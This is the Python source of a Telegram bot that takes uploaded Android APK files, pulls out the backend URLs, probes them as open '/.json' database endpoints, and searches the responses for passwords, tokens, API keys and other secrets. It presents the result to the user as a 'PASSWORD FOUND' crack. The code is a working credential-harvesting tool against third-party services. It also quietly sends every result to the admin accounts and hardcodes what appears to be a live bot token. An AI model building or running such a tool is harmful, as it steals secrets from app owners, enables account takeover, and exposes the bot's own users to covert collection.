#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import aiohttp
import os
import re
import zipfile
import tempfile
import shutil
import json
import sqlite3
import sys
import time
from typing import Dict, Set, Tuple, Optional
from datetime import datetime
import logging

# Force Python 3.11 compatibility
try:
    import nest_asyncio
    nest_asyncio.apply()
except:
    pass

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8663292682:AAFVULQdKpE0j0pkqgWopjbour7cm0muypc"
ADMIN_IDS = [8429344650]

MAX_WORKERS = 500
TEST_TIMEOUT = 2
MAX_CONNECTIONS = 500

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)-8s | %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("PWD_BOT")

user_sessions = {}

# ============================================================
# DATABASE
# ============================================================
DB_PATH = os.path.join('/tmp', 'bot_data.db')
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS required_channels (channel_username TEXT PRIMARY KEY, channel_name TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, verified INTEGER DEFAULT 1, joined_at TEXT)''')
conn.commit()

# ============================================================
# FORCE JOIN FUNCTIONS - DISABLED
# ============================================================
def get_required_channels():
    c.execute("SELECT channel_username, channel_name FROM required_channels")
    return c.fetchall()

async def check_user_joined(user_id, context):
    return True

async def send_join_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    c.execute("UPDATE users SET verified = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    await update.message.reply_text("✅ Auto-verified! Send /start again.")
    return True

async def verify_membership(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    c.execute("UPDATE users SET verified = 1, joined_at = ? WHERE user_id = ?", (datetime.now().isoformat(), user_id))
    conn.commit()
    await query.edit_message_text(
        "✅ *VERIFIED* ✅\n\nYou now have full access.\nSend /start to begin.",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔓 FIND PASSWORD", callback_data="crack")]
        ])
    )

# ============================================================
# ADMIN COMMANDS
# ============================================================
async def admin_add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command")
        return
    try:
        parts = update.message.text.split(maxsplit=2)
        if len(parts) < 2:
            await update.message.reply_text("Usage: /addchannel @username ChannelName")
            return
        channel_username = parts[1]
        channel_name = parts[2] if len(parts) > 2 else channel_username
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
        c.execute("INSERT OR IGNORE INTO required_channels VALUES (?, ?)", (channel_username, channel_name))
        conn.commit()
        await update.message.reply_text(f"✅ Channel {channel_username} added")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def admin_remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command")
        return
    try:
        channel_username = update.message.text.split()[1]
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
        c.execute("DELETE FROM required_channels WHERE channel_username = ?", (channel_username,))
        conn.commit()
        await update.message.reply_text(f"✅ Channel {channel_username} removed")
    except:
        await update.message.reply_text("Usage: /removechannel @username")

async def admin_list_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command")
        return
    channels = get_required_channels()
    if not channels:
        await update.message.reply_text("📭 No required channels")
        return
    msg = "📢 **Required Channels:**\n\n"
    for channel_username, channel_name in channels:
        msg += f"• {channel_username} - {channel_name}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command")
        return
    msg = update.message.text.replace('/broadcast', '', 1).strip()
    if not msg:
        await update.message.reply_text("Usage: /broadcast your message here")
        return
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    sent = 0
    for user in users:
        try:
            await update.get_bot().send_message(user[0], f"📢 *BROADCAST*\n\n{msg}", parse_mode='Markdown')
            sent += 1
        except:
            pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command")
        return
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE verified = 1")
    verified_users = c.fetchone()[0]
    channels = get_required_channels()
    msg = f"📊 *Bot Statistics*\n\n"
    msg += f"👥 Total users: {total_users}\n"
    msg += f"✅ Verified users: {verified_users}\n"
    msg += f"🔗 Required channels: {len(channels)}\n"
    msg += f"⚡ Status: Active"
    await update.message.reply_text(msg, parse_mode='Markdown')

# ============================================================
# EXTRACT APIS & PASSWORD FINDING
# ============================================================
def extract_apis_from_arsc(apk_path: str) -> Set[str]:
    apis = set()
    try:
        with zipfile.ZipFile(apk_path, 'r') as zf:
            if 'resources.arsc' not in zf.namelist():
                return apis
            with zf.open('resources.arsc') as arsc_file:
                data = arsc_file.read()
                text = data.decode('utf-8', errors='ignore')
                urls = re.findall(r'https?://[a-zA-Z0-9./?=_%:-]+', text)
                for url in urls:
                    if 15 < len(url) < 500:
                        url = url.rstrip('/') + '/.json'
                        apis.add(url)
    except Exception as e:
        log.error(f"Extract error: {e}")
    return apis

def find_password_in_json(data) -> Optional[str]:
    if not data:
        return None
    password_keys = ['password', 'pass', 'pwd', 'passwd', 'pin', 'code', 'admin_pass', 'login_password', 
                     'profilePassword', 'user_pass', 'api_key', 'apikey', 'secret', 'token', 'admin', 
                     'login', 'auth', 'key', 'access_token', 'db_password', 'ftp_password', 'mail_password']
    def is_valid_password(val):
        if not isinstance(val, str):
            return False
        if re.match(r'^\d{4,10}$', val):
            return True
        if 4 <= len(val) <= 20:
            return True
        return False
    def search(obj, depth=0):
        if depth > 10:
            return None
        if isinstance(obj, dict):
            for key, value in obj.items():
                key_lower = str(key).lower()
                for pk in password_keys:
                    if pk in key_lower:
                        if is_valid_password(value):
                            return str(value)
                        if isinstance(value, dict):
                            result = search(value, depth + 1)
                            if result:
                                return result
                if isinstance(value, (dict, list)):
                    result = search(value, depth + 1)
                    if result:
                        return result
        elif isinstance(obj, list):
            for item in obj:
                result = search(item, depth + 1)
                if result:
                    return result
        return None
    return search(data)

async def test_and_crack(url: str, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore) -> Tuple[str, bool, Optional[str]]:
    async with semaphore:
        try:
            timeout = aiohttp.ClientTimeout(total=TEST_TIMEOUT, connect=1)
            async with session.get(url, timeout=timeout, ssl=False) as resp:
                if resp.status == 200:
                    try:
                        data = await resp.json()
                        password = find_password_in_json(data)
                        return url, True, password
                    except:
                        return url, True, None
                return url, False, None
        except:
            return url, False, None

# ============================================================
# BOT START HANDLER
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    log.info(f"🔥 /start received from {user_id}")
    
    try:
        c.execute("INSERT OR REPLACE INTO users (user_id, verified, joined_at) VALUES (?, 1, ?)", 
                  (user_id, datetime.now().isoformat()))
        conn.commit()
    except Exception as e:
        log.error(f"DB error: {e}")
    
    if user_id in user_sessions:
        await cleanup_session(user_id)
    
    user_sessions[user_id] = {
        'apks': [],
        'temp_dir': tempfile.mkdtemp(),
        'status': 'waiting'
    }
    
    text = f"👋 Welcome {update.effective_user.first_name}!\n\n🔓 Click below to find passwords from APK files"
    
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔓 FIND PASSWORD", callback_data="crack")]
        ])
    )
    log.info(f"✅ /start response sent to {user_id}")

# ============================================================
# CRACKING HANDLERS
# ============================================================
async def crack_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    log.info(f"🔓 Crack button clicked by {user_id}")
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'apks': [],
            'temp_dir': tempfile.mkdtemp(),
            'status': 'waiting'
        }
        log.info(f"🆕 Auto-created session for {user_id}")
    
    await query.edit_message_text(
        "📦 *SEND APK FILE* 📦\n\nSend me your APK file\nType /done when finished\nType /cancel to cancel\n\nYou can send multiple APKs",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]])
    )

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    log.info(f"📦 handle_apk called by {user_id}")
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'apks': [],
            'temp_dir': tempfile.mkdtemp(),
            'status': 'waiting'
        }
        log.info(f"🆕 Auto-created session for {user_id} from handle_apk")
    
    if update.message.text:
        text = update.message.text.strip()
        if text == '/done':
            await process_apks(update, context)
            return
        elif text == '/cancel':
            await cleanup_session(user_id)
            await update.message.reply_text("❌ Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔓 FIND PASSWORD", callback_data="crack")]]))
            return
        else:
            await update.message.reply_text("Send APK file or type /done")
            return
    
    if not update.message.document:
        return
    
    doc = update.message.document
    file_name = doc.file_name or "unknown.apk"
    
    if not file_name.lower().endswith('.apk'):
        await update.message.reply_text("❌ Please send a valid .apk file")
        return
    
    status_msg = await update.message.reply_text(f"⏳ Processing `{file_name[:35]}`...", parse_mode='Markdown')
    
    try:
        file = await doc.get_file()
        temp_dir = user_sessions[user_id]['temp_dir']
        file_path = os.path.join(temp_dir, file_name)
        await file.download_to_drive(file_path)
        
        loop = asyncio.get_event_loop()
        apis = await loop.run_in_executor(None, extract_apis_from_arsc, file_path)
        
        user_sessions[user_id]['apks'].append({
            'name': file_name,
            'apis': list(apis),
            'count': len(apis),
            'path': file_path
        })
        
        total_apks = len(user_sessions[user_id]['apks'])
        total_apis = sum(a['count'] for a in user_sessions[user_id]['apks'])
        
        await status_msg.edit_text(
            f"✅ `{file_name[:35]}`\n🔗 APIs found: `{len(apis)}`\n📦 Total: `{total_apks}` APKs | `{total_apis}` APIs\n\nSend more or type `/done`",
            parse_mode='Markdown'
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)[:50]}")
        log.error(f"APK error: {e}")

async def process_apks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    log.info(f"🔍 Processing APKs for {user_id}")
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ No session. Send /start first")
        return
    
    apks = user_sessions[user_id]['apks']
    
    if not apks:
        await update.message.reply_text("❌ No APK files received. Send APK files first.")
        return
    
    all_apis = set()
    for apk in apks:
        for api in apk['apis']:
            all_apis.add(api)
    
    total_apis = len(all_apis)
    
    if total_apis == 0:
        await update.message.reply_text("❌ No APIs found in the APK(s)")
        await cleanup_session(user_id)
        return
    
    status_msg = await update.message.reply_text(f"🔍 Testing `{total_apis}` APIs...", parse_mode='Markdown')
    
    connector = aiohttp.TCPConnector(limit=MAX_CONNECTIONS)
    semaphore = asyncio.Semaphore(MAX_WORKERS)
    
    found_password = None
    working_apis = []
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [test_and_crack(api, session, semaphore) for api in all_apis]
        tested = 0
        
        for future in asyncio.as_completed(tasks):
            url, works, password = await future
            tested += 1
            
            if works:
                working_apis.append(url)
                if password and not found_password:
                    found_password = password
            
            if tested % 50 == 0 or tested == total_apis:
                try:
                    await status_msg.edit_text(f"🔍 Testing: `{tested}/{total_apis}`\n✅ Working: `{len(working_apis)}`", parse_mode='Markdown')
                except:
                    pass
    
    if found_password:
        await status_msg.edit_text(
            f"✅ *PASSWORD FOUND* ✅\n\n🔓 `{found_password}`\n\nTap the button below to copy",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"📋 COPY PASSWORD", callback_data=f"copy_{found_password}")],
                [InlineKeyboardButton("🔓 FIND ANOTHER", callback_data="crack")]
            ])
        )
    else:
        await status_msg.edit_text(
            f"❌ *NO PASSWORD FOUND* ❌\n\n📊 Summary:\n• APKs: `{len(apks)}`\n• APIs found: `{total_apis}`\n• Working APIs: `{len(working_apis)}`",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 TRY ANOTHER", callback_data="crack")]
            ])
        )
    
    await send_report_to_admin(update, user_id, apks, total_apis, working_apis, found_password)
    await cleanup_session(user_id)

async def send_report_to_admin(update: Update, user_id: int, apks: list, total_apis: int, working_apis: list, password: Optional[str]):
    for admin_id in ADMIN_IDS:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_file = f"crack_report_{user_id}_{timestamp}.txt"
            
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write("=" * 70 + "\n")
                f.write("PASSWORD CRACK REPORT\n")
                f.write("=" * 70 + "\n\n")
                f.write(f"User ID: {user_id}\n")
                f.write(f"Username: @{update.effective_user.username or 'N/A'}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                f.write(f"APKs Submitted: {len(apks)}\n")
                for i, apk in enumerate(apks, 1):
                    f.write(f"  {i}. {apk['name']} - {apk['count']} APIs\n")
                f.write(f"\nTotal APIs Found: {total_apis}\n")
                f.write(f"Working APIs: {len(working_apis)}\n")
                f.write(f"Password Found: {password or 'NOT FOUND'}\n\n")
                
                if working_apis:
                    f.write("WORKING APIS:\n")
                    for api in sorted(working_apis)[:20]:
                        f.write(f"{api}\n")
                
                if password:
                    f.write(f"\nCRACKED PASSWORD: {password}\n")
            
            with open(report_file, 'rb') as f:
                await update.get_bot().send_document(admin_id, f, filename=f"crack_report_{user_id}_{timestamp}.txt", caption=f"🔓 Report from @{update.effective_user.username or user_id}")
            os.remove(report_file)
        except Exception as e:
            log.error(f"Failed to send report to admin {admin_id}: {e}")

async def copy_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    password = query.data.replace("copy_", "")
    await query.answer(f"📋 Password copied: {password}", show_alert=True)

async def cancel_session_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await cleanup_session(user_id)
    await query.answer("Session cancelled")
    await query.edit_message_text("❌ Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔓 FIND PASSWORD", callback_data="crack")]]))

async def cleanup_session(user_id: int):
    if user_id in user_sessions:
        temp_dir = user_sessions[user_id].get('temp_dir')
        if temp_dir and os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass
        del user_sessions[user_id]
        log.info(f"🧹 Session cleaned for {user_id}")

# ============================================================
# MAIN
# ============================================================
def main():
    log.info("=" * 50)
    log.info("🚀 BOT STARTED - PASSWORD FINDER ACTIVE")
    log.info(f"👑 Admin IDs: {ADMIN_IDS}")
    log.info("=" * 50)
    
    # FIX: Use older version compatibility
    try:
        app = Application.builder().token(BOT_TOKEN).build()
    except Exception as e:
        log.error(f"Build error: {e}")
        # Fallback for older versions
        from telegram.ext import Updater
        updater = Updater(token=BOT_TOKEN)
        app = updater.application
    
    # COMMAND HANDLERS
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("done", handle_apk))
    app.add_handler(CommandHandler("cancel", handle_apk))
    app.add_handler(CommandHandler("addchannel", admin_add_channel))
    app.add_handler(CommandHandler("removechannel", admin_remove_channel))
    app.add_handler(CommandHandler("listchannels", admin_list_channels))
    app.add_handler(CommandHandler("broadcast", admin_broadcast))
    app.add_handler(CommandHandler("stats", admin_stats))
    
    # CALLBACK QUERY HANDLERS
    app.add_handler(CallbackQueryHandler(crack_prompt, pattern="^crack$"))
    app.add_handler(CallbackQueryHandler(copy_password, pattern="^copy_"))
    app.add_handler(CallbackQueryHandler(cancel_session_callback, pattern="^cancel$"))
    app.add_handler(CallbackQueryHandler(verify_membership, pattern="^verify_membership$"))
    
    # MESSAGE HANDLERS
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_apk))
    
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
